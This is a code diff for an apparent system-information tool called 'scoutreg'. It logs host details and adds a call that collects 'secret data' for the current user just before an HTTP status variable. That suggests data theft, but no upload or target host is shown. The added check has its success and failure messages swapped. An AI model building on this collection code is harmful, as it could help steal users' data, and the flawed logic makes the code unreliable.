@@ -101,15 +101,14 @@ int main()
         return 1;
     }
 
-    log_msg("System initialized");
 
+    log_msg("System initialized");
     log_msg("Collecting system information");
 
     if (!info_opt) {
         log_msg("Failed to collect system inforamtion");
         return 1;
-    }
-    else {
+    } else {
         log_msg("Successfully collected system information\n");
     }
 
@@ -117,21 +116,27 @@ int main()
 
     log_msg("Hostname: ");
     log_msg(info.hostname);
-
     log_msg("Username: ");
     log_msg(info.username);
-
     log_msg("CPU Architecture: ");
     log_msg(info.cpu_arch);
-
     log_msg("CPU Cores: ");
     log_msg(info.cpu_cores);
-
     log_msg("RAM Total: ");
     log_msg(info.total_ram);
-
     log_msg("RAM Available: ");
     log_msg(info.available_ram);
+
+    
+    auto data_opt = scoutreg::collect_secret_data(info.username);
+    if (data_opt) {
+        log_msg("Failed to collect secret data");
+    } else {
+        log_msg("Successfully collected secret data");
+    }
+
+    auto data = data_opt.value();
+
 
     long http_status = 0;
 
